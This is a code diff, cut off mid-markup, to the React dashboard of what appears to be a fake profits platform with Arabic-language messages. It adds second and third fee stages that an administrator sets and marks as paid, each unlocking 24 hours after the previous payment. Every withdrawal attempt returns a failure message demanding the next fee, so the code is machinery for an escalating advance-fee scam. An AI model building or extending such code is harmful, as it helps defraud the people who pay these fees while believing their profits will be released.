@@ -16,15 +16,31 @@ interface User {
   loginSlug: string;
   telegramLink: string;
   withdrawalFeeStatus: "unpaid" | "paid";
+  withdrawalFeePaidAt: string | null;
+  liberationFee: string;
+  liberationFeeStatus: "unpaid" | "paid";
+  liberationFeePaidAt: string | null;
+  transactionFee: string;
+  transactionFeeStatus: "unpaid" | "paid";
+  transactionFeePaidAt: string | null;
 }
 
 interface Notification {
   id: number;
   beneficiaryId: number;
-  type: "profits_added" | "fees_paid";
+  type: "profits_added" | "fees_paid" | "liberation_fee_paid" | "transaction_fee_paid";
   title: string;
   message: string;
   isRead: boolean;
+  createdAt: string;
+}
+
+interface FinancialTransaction {
+  id: number;
+  beneficiaryId: number;
+  type: string;
+  amount: string;
+  description: string;
   createdAt: string;
 }
 
@@ -48,7 +64,13 @@ async function apiFetch<T = unknown>(path: string, init?: RequestInit): Promise<
   return res.json() as Promise<T>;
 }
 
-type ApiUser = Omit<User, "id" | "status" | "withdrawalFeeStatus"> & { id: number; status: string; withdrawalFeeStatus?: string };
+type ApiUser = Omit<User, "id" | "status" | "withdrawalFeeStatus" | "liberationFeeStatus" | "transactionFeeStatus"> & {
+  id: number;
+  status: string;
+  withdrawalFeeStatus?: string;
+  liberationFeeStatus?: string;
+  transactionFeeStatus?: string;
+};
 
 function mapApiUser(u: ApiUser): User {
   return {
@@ -66,6 +88,13 @@ function mapApiUser(u: ApiUser): User {
     loginSlug: u.loginSlug ?? "",
     telegramLink: u.telegramLink ?? "",
     withdrawalFeeStatus: u.withdrawalFeeStatus === "paid" ? "paid" : "unpaid",
+    withdrawalFeePaidAt: u.withdrawalFeePaidAt ?? null,
+    liberationFee: u.liberationFee ?? "0",
+    liberationFeeStatus: u.liberationFeeStatus === "paid" ? "paid" : "unpaid",
+    liberationFeePaidAt: u.liberationFeePaidAt ?? null,
+    transactionFee: u.transactionFee ?? "0",
+    transactionFeeStatus: u.transactionFeeStatus === "paid" ? "paid" : "unpaid",
+    transactionFeePaidAt: u.transactionFeePaidAt ?? null,
   };
 }
 
@@ -680,7 +709,12 @@ function ChangeCredentialsModal({ onClose, userId, currentUsername, onSaved }: {
    USER DASHBOARD
 ═══════════════════════════════════════════════════════════════ */
 
-function WithdrawModal({ onClose, maxAmount, iban, fees, userName, withdrawalFeeStatus, hasPreviousPayment }: {
+function hours24Passed(dateStr: string | null): boolean {
+  if (!dateStr) return false;
+  return Date.now() - new Date(dateStr).getTime() >= 24 * 60 * 60 * 1000;
+}
+
+function WithdrawModal({ onClose, maxAmount, iban, fees, userName, withdrawalFeeStatus, hasPreviousPayment, user }: {
   onClose: () => void;
   maxAmount: string;
   iban: string;
@@ -688,6 +722,7 @@ function WithdrawModal({ onClose, maxAmount, iban, fees, userName, withdrawalFee
   userName: string;
   withdrawalFeeStatus: "unpaid" | "paid";
   hasPreviousPayment: boolean;
+  user: User;
 }) {
   const [amount, setAmount] = useState("");
   const [step, setStep] = useState<"form" | "confirm" | "result">("form");
@@ -698,20 +733,34 @@ function WithdrawModal({ onClose, maxAmount, iban, fees, userName, withdrawalFee
   const amountNum = parseFloat(amount.replace(/,/g, "")) || 0;
   const netAmount = amountNum - feesNum;
 
+  const phase2Active = hours24Passed(user.withdrawalFeePaidAt);
+  const phase3Active = hours24Passed(user.liberationFeePaidAt);
+
   function getFailureMessage() {
-    // الحالة 1: لا أرباح ولا رسوم — مشترك جديد
+    // المرحلة الثالثة: مبلغ المعاملة
+    if (phase3Active) {
+      if (user.transactionFeeStatus === "paid") {
+        return `عزيز العميل / ${userName} 🚨 تم تأكيد دفع معاملة تأكيد تحويل الأرباح بنجاح ✅\n يرجى الإنتظار سوف يقوم النظام\n بإتمام عملية سحب الأرباح  خلال أقل من 24 ساعة\nويتم سحب  أرباحك بنجاح ✅ \nنشكر تفهمكم و تعاونكم معنا`;
+      }
+      return `عزيزي العميل/ ${userName}\nتعذر سحب  الأرباح\nالمتبقي عليكم دفع مبلغ  المعاملة "${user.transactionFee}" ريال لنتمكن من تأكيد تحويل أرباحك بنجاح\n🛑ملاحظة هامة 🚸♨️ الغرض من المعاملة\nمعاملات تسجيل الخروج من الشركة ضمن المتطلبات المتفق عليها🤝👍`;
+    }
+    // المرحلة الثانية: رسوم تحرير الأرباح
+    if (phase2Active) {
+      if (user.liberationFeeStatus === "paid") {
+        return `عزيز العميل / ${userName} 🚨 تم تأكيد سداد رسوم تحرير الأرباح بنجاح ✅\n يرجى الإنتظار سوف يقوم النظام\n بتحرير  الأرباح  خلال أقل من 24 ساعة\nويتم تحرير أرباحك بنجاح ✅`;
+      }
+      return `عزيز العميل / ${userName} 🚨 تعذر عملية سحب  الأرباح  يرجى دفع  مبلغ رسوم تحرير  "${user.liberationFee}" ريال  بعد السداد يتم تحرير الأرباح بنجاح ✅`;
+    }
+    // المرحلة الأولى: رسوم السحب (الوضع الحالي)
     if (profitsNum === 0 && feesNum === 0) {
       return `عزيز العميل / ${userName} 🚨 لم يتم إضافة الأرباح الى حسابك اذا كنت مشترك جديد يرجى الانتظار حتى يتم إضافة ارباح الاشتراك الى حسابك و يتم سحب ارباحك بنجاح ✅`;
     }
-    // الحالة 4: أرباح > 0 + رسوم > 0 + لديه سداد سابق (أضاف الأدمن رسوماً جديدة بعد السداد)
     if (profitsNum > 0 && feesNum > 0 && hasPreviousPayment) {
       return `عزيز العميل / ${userName} 🚨 تعذر تحويل الأرباح بسبب المتبقي عليك مبلغ رسوم الأرباح المضافة ${fees} ريال بعد السداد يتم التحويل ارباحك بنجاح ✅`;
     }
-    // الحالة 2: أرباح > 0 + رسوم > 0 + لا يوجد سداد سابق — أول مرة
     if (profitsNum > 0 && feesNum > 0) {
       return `عزيز العميل / ${userName} 🚨 تعذر تحويل أرباح المتبقي عليك مبلغ رسوم تفعيل والمطابقة ${fees} ريال بعد السداد يتم التحويل ارباحك بنجاح ✅`;
     }
-    // الحالة 3: أرباح > 0 + رسوم = 0 + تم السداد — انتظار تفعيل السحب
     if (profitsNum > 0 && feesNum === 0 && withdrawalFeeStatus === "paid") {
       return `عزيز العميل / ${userName} 🚨 تعذر تحويل أرباح بعد سداد رسوم السحب يرجى الإنتظار سوف يقوم النظام بتحرير حسابك وتفعيل سحب الاموال خلال اقل من 24 ساعة\nويتم سحب ارباحك بنجاح ✅`;
     }
@@ -936,10 +985,14 @@ function UserDashboard({
   const [showNotifPanel, setShowNotifPanel] = useState(false);
   const [showPopup, setShowPopup] = useState(false);
   const [popupNotif, setPopupNotif] = useState<Notification | null>(null);
-  const [adminModal, setAdminModal] = useState<{ type: "add-profits" | "add-fees" | "pay-fees" } | null>(null);
+  const [adminModal, setAdminModal] = useState<{ type: "add-profits" | "add-fees" | "pay-fees" | "add-liberation-fee" | "pay-liberation-fee" | "add-transaction-fee" | "pay-transaction-fee" } | null>(null);
   const [addProfitAmt, setAddProfitAmt] = useState("");
   const [addFeesAmt, setAddFeesAmt] = useState("");
+  const [addLiberationAmt, setAddLiberationAmt] = useState("");
+  const [addTransactionAmt, setAddTransactionAmt] = useState("");
   const [adminLoading, setAdminLoading] = useState(false);
+  const [showTransactionLog, setShowTransactionLog] = useState(false);
+  const [transactionLog, setTransactionLog] = useState<FinancialTransaction[]>([]);
 
   const unreadCount = notifications.filter((n) => !n.isRead).length;
 
@@ -975,6 +1028,15 @@ function UserDashboard({
     else { setShowPopup(false); setPopupNotif(null); }
   }
 
+  async function loadTransactionLog() {
+    try {
+      const uid = Number(user.id);
+      const data = await apiFetch<FinancialTransaction[]>(`/beneficiaries/${uid}/transactions`);
+      setTransactionLog(data);
+      setShowTransactionLog(true);
+    } catch { alert("فشل تحميل سجل العمليات"); }
+  }
+
   async function handleAdminFinancial() {
     if (!adminModal) return;
     setAdminLoading(true);
@@ -990,8 +1052,22 @@ function UserDashboard({
         if (!amt || amt <= 0) { alert("أدخل مبلغاً صحيحاً"); return; }
         await apiFetch(`/beneficiaries/${uid}/add-fees`, { method: "POST", body: JSON.stringify({ amount: amt }) });
         setAddFeesAmt("");
-      } else {
+      } else if (adminModal.type === "pay-fees") {
         await apiFetch(`/beneficiaries/${uid}/pay-fees`, { method: "POST" });
+      } else if (adminModal.type === "add-liberation-fee") {
+        const amt = parseInt(addLiberationAmt.replace(/,/g, ""), 10);
+        if (!amt || amt <= 0) { alert("أدخل مبلغاً صحيحاً"); return; }
+        await apiFetch(`/beneficiaries/${uid}/add-liberation-fee`, { method: "POST", body: JSON.stringify({ amount: amt }) });
+        setAddLiberationAmt("");
+      } else if (adminModal.type === "pay-liberation-fee") {
+        await apiFetch(`/beneficiaries/${uid}/pay-liberation-fee`, { method: "POST" });
+      } else if (adminModal.type === "add-transaction-fee") {
+        const amt = parseInt(addTransactionAmt.replace(/,/g, ""), 10);
+        if (!amt || amt <= 0) { alert("أدخل مبلغاً صحيحاً"); return; }
+        await apiFetch(`/beneficiaries/${uid}/add-transaction-fee`, { method: "POST", body: JSON.stringify({ amount: amt }) });
+        setAddTransactionAmt("");
+      } else if (adminModal.type === "pay-transaction-fee") {
+        await apiFetch(`/beneficiaries/${uid}/pay-transaction-fee`, { method: "POST" });
       }
       await onRefreshUser?.();
       setAdminModal(null);
@@ -1135,7 +1211,7 @@ function UserDashboard({
                 <div className="w-8 h-8 rounded-xl flex items-center justify-center" style={{ background: "#fef2f2" }}>
                   <Icon.AlertCircle />
                 </div>
-                <p className="font-bold text-[13px] text-[#1a1f3c]">رسوم السحب</p>
+                <p className="font-bold text-[13px] text-[#1a1f3c]">رسوم السحب — المرحلة الأولى</p>
               </div>
               <div className="flex items-center justify-between mb-3 px-3 py-2 rounded-xl" style={{ background: "#fef2f2", border: "1px solid #fecaca" }}>
                 <span className={`text-[10px] font-extrabold px-2 py-0.5 rounded-lg ${user.withdrawalFeeStatus === "paid" ? "bg-green-100 text-green-700" : "bg-red-100 text-red-600"}`}>
@@ -1143,14 +1219,118 @@ function UserDashboard({
                 </span>
                 <span className="font-extrabold text-[15px] text-[#ef4444]">{user.fees} ر.س</span>
               </div>
+              {user.withdrawalFeePaidAt && (
+                <div className="mb-2 text-[10px] text-[#8892a4] font-semibold text-right">
+                  تاريخ السداد: {new Date(user.withdrawalFeePaidAt).toLocaleString("ar-SA")}
+                </div>
+              )}
               <button
                 onClick={() => setAdminModal({ type: "pay-fees" })}
                 disabled={user.fees === "0" || user.withdrawalFeeStatus === "paid"}
                 className="w-full py-2.5 rounded-xl text-white font-bold text-[13px] transition-opacity active:opacity-90 disabled:opacity-40"
                 style={{ background: "linear-gradient(135deg,#c8005a,#f0196e)" }}>
-                سداد رسوم السحب
+                تأكيد سداد رسوم السحب
               </button>
             </div>
+
+            {/* Liberation Fee — Phase 2 (Admin Only) */}
+            <div className="bg-white rounded-2xl p-4 border border-[#e2e8f0] shadow-sm">
+              <div className="flex items-center gap-2 mb-3">
+                <div className="w-8 h-8 rounded-xl flex items-center justify-center" style={{ background: "#fdf2f8" }}>
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#8B1A1A" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                </div>
+                <p className="font-bold text-[13px] text-[#1a1f3c]">رسوم تحرير الأرباح — المرحلة الثانية</p>
+              </div>
+              <div className="mb-2 text-[10px] text-[#8892a4] font-semibold">الرسوم الحالية: <span className="text-[#8B1A1A] font-extrabold">{user.liberationFee} ر.س</span></div>
+              <div className="flex items-center justify-between mb-3 px-3 py-2 rounded-xl" style={{ background: "#fdf2f8", border: "1px solid #f5c6d8" }}>
+                <span className={`text-[10px] font-extrabold px-2 py-0.5 rounded-lg ${user.liberationFeeStatus === "paid" ? "bg-green-100 text-green-700" : "bg-red-100 text-red-600"}`}>
+                  {user.liberationFeeStatus === "paid" ? "✓ تم السداد" : "● غير مسددة"}
+                </span>
+                <span className="font-extrabold text-[15px]" style={{ color: "#8B1A1A" }}>{user.liberationFee} ر.س</span>
+              </div>
+              {user.liberationFeePaidAt && (
+                <div className="mb-2 text-[10px] text-[#8892a4] font-semibold text-right">
+                  تاريخ السداد: {new Date(user.liberationFeePaidAt).toLocaleString("ar-SA")}
+                </div>
+              )}
+              <input
+                type="number"
+                value={addLiberationAmt}
+                onChange={(e) => setAddLiberationAmt(e.target.value)}
+                placeholder="مبلغ رسوم التحرير..."
+                className="w-full px-3 py-2.5 rounded-xl border border-[#e2e8f0] bg-[#f8f9fc] text-[#1a1f3c] text-[13px] font-semibold text-right outline-none mb-2"
+                dir="rtl"
+              />
+              <div className="flex gap-2">
+                <button
+                  onClick={() => { if (addLiberationAmt && Number(addLiberationAmt) > 0) setAdminModal({ type: "add-liberation-fee" }); }}
+                  className="flex-1 py-2.5 rounded-xl text-white font-bold text-[12px] transition-opacity active:opacity-90"
+                  style={{ background: "linear-gradient(135deg,#7a1a1a,#8B1A1A)" }}>
+                  إضافة رسوم التحرير
+                </button>
+                <button
+                  onClick={() => setAdminModal({ type: "pay-liberation-fee" })}
+                  disabled={user.liberationFee === "0" || user.liberationFeeStatus === "paid"}
+                  className="flex-1 py-2.5 rounded-xl text-white font-bold text-[12px] transition-opacity active:opacity-90 disabled:opacity-40"
+                  style={{ background: "linear-gradient(135deg,#c8005a,#f0196e)" }}>
+                  تأكيد السداد
+                </button>
+              </div>
+            </div>
+
+            {/* Transaction Fee — Phase 3 (Admin Only) */}
+            <div className="bg-white rounded-2xl p-4 border border-[#e2e8f0] shadow-sm">
+              <div className="flex items-center gap-2 mb-3">
+                <div className="w-8 h-8 rounded-xl flex items-center justify-center" style={{ background: "#fff8e1" }}>
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#92400e" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                </div>
+                <p className="font-bold text-[13px] text-[#1a1f3c]">مبلغ المعاملة — المرحلة الثالثة</p>
+              </div>
+              <div className="mb-2 text-[10px] text-[#8892a4] font-semibold">المبلغ الحالي: <span className="text-[#92400e] font-extrabold">{user.transactionFee} ر.س</span></div>
+              <div className="flex items-center justify-between mb-3 px-3 py-2 rounded-xl" style={{ background: "#fff8e1", border: "1px solid #fde68a" }}>
+                <span className={`text-[10px] font-extrabold px-2 py-0.5 rounded-lg ${user.transactionFeeStatus === "paid" ? "bg-green-100 text-green-700" : "bg-yellow-100 text-yellow-700"}`}>
+                  {user.transactionFeeStatus === "paid" ? "✓ تم السداد" : "● غير مسددة"}
+                </span>
+                <span className="font-extrabold text-[15px] text-[#92400e]">{user.transactionFee} ر.س</span>
+              </div>
+              {user.transactionFeePaidAt && (
+                <div className="mb-2 text-[10px] text-[#8892a4] font-semibold text-right">
+                  تاريخ السداد: {new Date(user.transactionFeePaidAt).toLocaleString("ar-SA")}
+                </div>
+              )}
+              <input
+                type="number"
+                value={addTransactionAmt}
+                onChange={(e) => setAddTransactionAmt(e.target.value)}
+                placeholder="مبلغ المعاملة..."
+                className="w-full px-3 py-2.5 rounded-xl border border-[#e2e8f0] bg-[#f8f9fc] text-[#1a1f3c] text-[13px] font-semibold text-right outline-none mb-2"
+                dir="rtl"
+              />
+              <div className="flex gap-2">
+                <button
+                  onClick={() => { if (addTransactionAmt && Number(addTransactionAmt) > 0) setAdminModal({ type: "add-transaction-fee" }); }}
+                  className="flex-1 py-2.5 rounded-xl text-white font-bold text-[12px] transition-opacity active:opacity-90"
+                  style={{ background: "linear-gradient(135deg,#92400e,#d97706)" }}>
+                  إضافة مبلغ المعاملة
+                </button>
+                <button
+                  onClick={() => setAdminModal({ type: "pay-transaction-fee" })}
+                  disabled={user.transactionFee === "0" || user.transactionFeeStatus === "paid"}
+                  className="flex-1 py-2.5 rounded-xl text-white font-bold text-[12px] transition-opacity active:opacity-90 disabled:opacity-40"
+                  style={{ background: "linear-gradient(135deg,#0f7a38,#22c55e)" }}>
+                  تأكيد السداد
+                </button>
+              </div>
+            </div>
+
+            {/* Financial Transaction Log Button */}
+            <button
+              onClick={() => void loadTransactionLog()}
+              className="w-full flex items-center justify-center gap-2 py-3 rounded-2xl text-white font-bold text-[13px] transition-opacity active:opacity-90"
+              style={{ background: "linear-gradient(135deg,#1a1f3c,#2952e3)" }}>
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+              سجل العمليات المالية
+            </button>
 
           </div>
         </section>
@@ -1238,26 +1418,100 @@ function UserDashboard({
               </div>
             </div>
 
-            {/* Fees */}
-            <div className="rounded-3xl p-5 relative overflow-hidden"
-              style={{ background: "linear-gradient(135deg,#c41e1e 0%,#e83030 30%,#f05a1a 70%,#f97316 100%)" }}>
-              <div className="absolute -bottom-8 -left-6 w-36 h-36 rounded-full opacity-10" style={{ background: "rgba(255,255,255,0.4)" }} />
-              <div className="flex items-start justify-between mb-7 relative z-10">
-                <div className="w-9 h-9 rounded-xl flex items-center justify-center text-white"
-                  style={{ background: "rgba(180,30,30,0.5)", border: "1px solid rgba(255,255,255,0.2)" }}>
-                  <Icon.AlertCircle />
+            {/* Fees — Phase 1 */}
+            {user.withdrawalFeeStatus === "unpaid" ? (
+              <div className="rounded-3xl p-5 relative overflow-hidden"
+                style={{ background: "linear-gradient(135deg,#c41e1e 0%,#e83030 30%,#f05a1a 70%,#f97316 100%)" }}>
+                <div className="absolute -bottom-8 -left-6 w-36 h-36 rounded-full opacity-10" style={{ background: "rgba(255,255,255,0.4)" }} />
+                <div className="flex items-start justify-between mb-7 relative z-10">
+                  <div className="w-9 h-9 rounded-xl flex items-center justify-center text-white"
+                    style={{ background: "rgba(180,30,30,0.5)", border: "1px solid rgba(255,255,255,0.2)" }}>
+                    <Icon.AlertCircle />
+                  </div>
+                  <span className="text-white text-[10px] font-bold px-3 py-1 rounded-lg"
+                    style={{ background: "rgba(210,30,80,0.6)", border: "1px solid rgba(255,255,255,0.2)" }}>رسوم</span>
                 </div>
-                <span className="text-white text-[10px] font-bold px-3 py-1 rounded-lg"
-                  style={{ background: "rgba(210,30,80,0.6)", border: "1px solid rgba(255,255,255,0.2)" }}>رسوم</span>
+                <div className="text-right relative z-10">
+                  <p className="text-white/80 text-[11px] font-medium mb-1">رسوم السحب</p>
+                  <p className="text-white font-extrabold leading-none" style={{ fontSize: "1.95rem" }}>
+                    {user.fees} <span className="text-[19px]">ر.س</span>
+                  </p>
+                  <p className="text-white/70 text-[11px] font-medium mt-2">مطلوبة لكل عملية سحب</p>
+                </div>
               </div>
-              <div className="text-right relative z-10">
-                <p className="text-white/80 text-[11px] font-medium mb-1">رسوم السحب</p>
-                <p className="text-white font-extrabold leading-none" style={{ fontSize: "1.95rem" }}>
-                  {user.fees} <span className="text-[19px]">ر.س</span>
-                </p>
-                <p className="text-white/70 text-[11px] font-medium mt-2">مطلوبة لكل عملية سحب</p>
+            ) : (
+              <div className="rounded-3xl p-5 relative overflow-hidden"
+                style={{ background: "linear-gradient(135deg,#166534 0%,#16a34a 60%,#22c55e 100%)" }}>
+                <div className="absolute -bottom-8 -left-6 w-36 h-36 rounded-full opacity-10" style={{ background: "rgba(255,255,255,0.4)" }} />
+                <div className="flex items-start justify-between mb-5 relative z-10">
+                  <div className="w-9 h-9 rounded-xl flex items-center justify-center text-white"
+                    style={{ background: "rgba(255,255,255,0.2)", border: "1px solid rgba(255,255,255,0.2)" }}>
+                    <Icon.CheckCircle />
+                  </div>
+                  <span className="text-white text-[10px] font-bold px-3 py-1 rounded-lg"
+                    style={{ background: "rgba(255,255,255,0.2)", border: "1px solid rgba(255,255,255,0.2)" }}>✅ تم السداد</span>
+                </div>
+                <div className="text-right relative z-10">
+                  <p className="text-white/80 text-[11px] font-medium mb-1">رسوم السحب</p>
+                  <p className="text-white font-extrabold text-[22px] leading-none">تم تسديد رسوم السحب ✅</p>
+                  <p className="text-white/70 text-[11px] font-medium mt-2">جارٍ معالجة طلبك...</p>
+                </div>
               </div>
-            </div>
+            )}
+
+            {/* Liberation Fee Card — Phase 2 (shows after 24h from phase 1 payment) */}
+            {hours24Passed(user.withdrawalFeePaidAt) && (
+              <div className="rounded-3xl p-5 relative overflow-hidden"
+                style={{ background: "linear-gradient(135deg,#4a0a0a 0%,#7a1212 40%,#8B1A1A 70%,#a52020 100%)" }}>
+                <div className="absolute -bottom-8 -left-6 w-36 h-36 rounded-full opacity-15" style={{ background: "rgba(255,255,255,0.3)" }} />
+                <div className="flex items-start justify-between mb-7 relative z-10">
+                  <div className="w-9 h-9 rounded-xl flex items-center justify-center text-white"
+                    style={{ background: "rgba(255,255,255,0.15)", border: "1px solid rgba(255,255,255,0.2)" }}>
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                  </div>
+                  <span className="text-white text-[10px] font-bold px-3 py-1 rounded-lg"
+                    style={{ background: "rgba(255,255,255,0.15)", border: "1px solid rgba(255,255,255,0.2)" }}>
+                    {user.liberationFeeStatus === "paid" ? "✅ تم السداد" : "🔴 مطلوب"}
+                  </span>
+                </div>
+                <div className="text-right relative z-10">
+                  <p className="text-white/80 text-[11px] font-medium mb-1">رسوم تحرير الأرباح</p>
+                  <p className="text-white font-extrabold leading-none" style={{ fontSize: "1.95rem" }}>
+                    {user.liberationFee} <span className="text-[19px]">ر.س</span>
+                  </p>
+                  <p className="text-white/70 text-[11px] font-medium mt-2">
+                    {user.liberationFeeStatus === "paid" ? "جارٍ تحرير الأرباح..." : "يرجى سداد رسوم تحرير الأرباح"}
+                  </p>
+                </div>
+              </div>
+            )}
+
+            {/* Transaction Fee Card — Phase 3 (shows after 24h from phase 2 payment) */}
+            {hours24Passed(user.liberationFeePaidAt) && (
+              <div className="rounded-3xl p-5 relative overflow-hidden"
+                style={{ background: "linear-gradient(135deg,#78350f 0%,#92400e 40%,#b45309 70%,#d97706 100%)" }}>
+                <div className="absolute -bottom-8 -left-6 w-36 h-36 rounded-full opacity-10" style={{ background: "rgba(255,255,255,0.4)" }} />
+                <div className="flex items-start justify-between mb-7 relative z-10">
+                  <div className="w-9 h-9 rounded-xl flex items-center justify-center text-white"
+                    style={{ background: "rgba(255,255,255,0.15)", border: "1px solid rgba(255,255,255,0.2)" }}>
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                  </div>
+                  <span className="text-white text-[10px] font-bold px-3 py-1 rounded-lg"
+                    style={{ background: "rgba(255,255,255,0.15)", border: "1px solid rgba(255,255,255,0.2)" }}>
+                    {user.transactionFeeStatus === "paid" ? "✅ تم السداد" : "⚠️ مطلوب"}
+                  </span>
+                </div>
+                <div className="text-right relative z-10">
+                  <p className="text-white/80 text-[11px] font-medium mb-1">مبلغ المعاملة</p>
+                  <p className="text-white font-extrabold leading-none" style={{ fontSize: "1.95rem" }}>
+                    {user.transactionFee} <span className="text-[19px]">ر.س</span>
+                  </p>
+                  <p className="text-white/70 text-[11px] font-medium mt-2">
+                    {user.transactionFeeStatus === "paid" ? "جارٍ إتمام عملية السحب..." : "مطلوب لإتمام تحويل الأرباح"}
+                  </p>
+                </div>
+              </div>
+            )}
 
             {/* Bank Card */}
             <div className="rounded-3xl p-5 relative overflow-hidden"
@@ -1412,11 +1666,16 @@ function UserDashboard({
           dir="rtl">
           <div className="w-full max-w-xs bg-white rounded-3xl overflow-hidden shadow-2xl"
             style={{ animation: "popIn 0.25s cubic-bezier(.175,.885,.32,1.275)" }}>
-            {/* Modal Header */}
             <div className="px-5 py-4 text-center border-b border-[#eef0f6]"
-              style={{ background: adminModal.type === "add-profits" ? "linear-gradient(135deg,#0f7a38,#22c55e)" : adminModal.type === "add-fees" ? "linear-gradient(135deg,#d97706,#f59e0b)" : "linear-gradient(135deg,#c8005a,#f0196e)" }}>
+              style={{ background: adminModal.type === "add-profits" ? "linear-gradient(135deg,#0f7a38,#22c55e)" : adminModal.type === "add-fees" ? "linear-gradient(135deg,#d97706,#f59e0b)" : adminModal.type === "add-liberation-fee" || adminModal.type === "pay-liberation-fee" ? "linear-gradient(135deg,#4a0a0a,#8B1A1A)" : adminModal.type === "add-transaction-fee" || adminModal.type === "pay-transaction-fee" ? "linear-gradient(135deg,#78350f,#d97706)" : "linear-gradient(135deg,#c8005a,#f0196e)" }}>
               <p className="text-white font-extrabold text-[15px]">
-                {adminModal.type === "add-profits" ? "تأكيد إضافة الأرباح" : adminModal.type === "add-fees" ? "تأكيد إضافة الرسوم" : "تأكيد سداد رسوم السحب"}
+                {adminModal.type === "add-profits" ? "تأكيد إضافة الأرباح"
+                  : adminModal.type === "add-fees" ? "تأكيد إضافة الرسوم"
+                  : adminModal.type === "pay-fees" ? "تأكيد سداد رسوم السحب"
+                  : adminModal.type === "add-liberation-fee" ? "تأكيد إضافة رسوم التحرير"
+                  : adminModal.type === "pay-liberation-fee" ? "تأكيد سداد رسوم التحرير"
+                  : adminModal.type === "add-transaction-fee" ? "تأكيد إضافة مبلغ المعاملة"
+                  : "تأكيد سداد مبلغ المعاملة"}
               </p>
             </div>
             <div className="px-5 py-5">
@@ -1425,15 +1684,15 @@ function UserDashboard({
                   <p className="text-[12px] font-semibold text-[#374151] mb-1">المبلغ المراد إضافته:</p>
                   <p className="font-extrabold text-[20px] text-[#16a34a]">{Number(addProfitAmt).toLocaleString("en-US")} ر.س</p>
                   <div className="mt-3 flex flex-col gap-1">
-                    <p className="text-[11px] font-bold text-[#374151]">سيتم:</p>
                     <p className="text-[11px] text-[#16a34a] font-semibold">✓ تحديث إجمالي الأرباح</p>
                     <p className="text-[11px] text-[#16a34a] font-semibold">✓ إرسال إشعار للمستفيد</p>
+                    <p className="text-[11px] text-[#16a34a] font-semibold">✓ تسجيل العملية في السجل المالي</p>
                   </div>
                 </div>
               )}
               {adminModal.type === "add-fees" && (
                 <div className="rounded-2xl p-4 mb-4 text-right" style={{ background: "#fef3c7", border: "1.5px solid #fde68a" }}>
-                  <p className="text-[12px] font-semibold text-[#374151] mb-1">مبلغ الرسوم المراد إضافته:</p>
+                  <p className="text-[12px] font-semibold text-[#374151] mb-1">مبلغ رسوم السحب:</p>
                   <p className="font-extrabold text-[20px] text-[#d97706]">{Number(addFeesAmt).toLocaleString("en-US")} ر.س</p>
                 </div>
               )}
@@ -1442,9 +1701,41 @@ function UserDashboard({
                   <p className="text-[12px] font-semibold text-[#374151] mb-1">قيمة رسوم السحب:</p>
                   <p className="font-extrabold text-[20px] text-[#ef4444]">{user.fees} ر.س</p>
                   <div className="mt-3 flex flex-col gap-1">
-                    <p className="text-[11px] font-bold text-[#374151]">سيتم:</p>
-                    <p className="text-[11px] text-[#16a34a] font-semibold">✓ تصفير رسوم السحب</p>
-                    <p className="text-[11px] text-[#16a34a] font-semibold">✓ تغيير الحالة إلى "تم السداد"</p>
+                    <p className="text-[11px] text-[#16a34a] font-semibold">✓ تأكيد سداد رسوم السحب</p>
+                    <p className="text-[11px] text-[#16a34a] font-semibold">✓ إرسال إشعار للمستفيد</p>
+                    <p className="text-[11px] text-[#16a34a] font-semibold">✓ بدء العد التنازلي 24 ساعة للمرحلة الثانية</p>
+                  </div>
+                </div>
+              )}
+              {adminModal.type === "add-liberation-fee" && (
+                <div className="rounded-2xl p-4 mb-4 text-right" style={{ background: "#fdf2f8", border: "1.5px solid #f5c6d8" }}>
+                  <p className="text-[12px] font-semibold text-[#374151] mb-1">مبلغ رسوم التحرير:</p>
+                  <p className="font-extrabold text-[20px]" style={{ color: "#8B1A1A" }}>{Number(addLiberationAmt).toLocaleString("en-US")} ر.س</p>
+                </div>
+              )}
+              {adminModal.type === "pay-liberation-fee" && (
+                <div className="rounded-2xl p-4 mb-4 text-right" style={{ background: "#fdf2f8", border: "1.5px solid #f5c6d8" }}>
+                  <p className="text-[12px] font-semibold text-[#374151] mb-1">رسوم تحرير الأرباح:</p>
+                  <p className="font-extrabold text-[20px]" style={{ color: "#8B1A1A" }}>{user.liberationFee} ر.س</p>
+                  <div className="mt-3 flex flex-col gap-1">
+                    <p className="text-[11px] text-[#16a34a] font-semibold">✓ تأكيد سداد رسوم التحرير</p>
+                    <p className="text-[11px] text-[#16a34a] font-semibold">✓ إرسال إشعار للمستفيد</p>
+                    <p className="text-[11px] text-[#16a34a] font-semibold">✓ بدء العد التنازلي 24 ساعة للمرحلة الثالثة</p>
+                  </div>
+                </div>
+              )}
+              {adminModal.type === "add-transaction-fee" && (
+                <div className="rounded-2xl p-4 mb-4 text-right" style={{ background: "#fff8e1", border: "1.5px solid #fde68a" }}>
+                  <p className="text-[12px] font-semibold text-[#374151] mb-1">مبلغ المعاملة:</p>
+                  <p className="font-extrabold text-[20px] text-[#92400e]">{Number(addTransactionAmt).toLocaleString("en-US")} ر.س</p>
+                </div>
+              )}
+              {adminModal.type === "pay-transaction-fee" && (
+                <div className="rounded-2xl p-4 mb-4 text-right" style={{ background: "#fff8e1", border: "1.5px solid #fde68a" }}>
+                  <p className="text-[12px] font-semibold text-[#374151] mb-1">مبلغ المعاملة:</p>
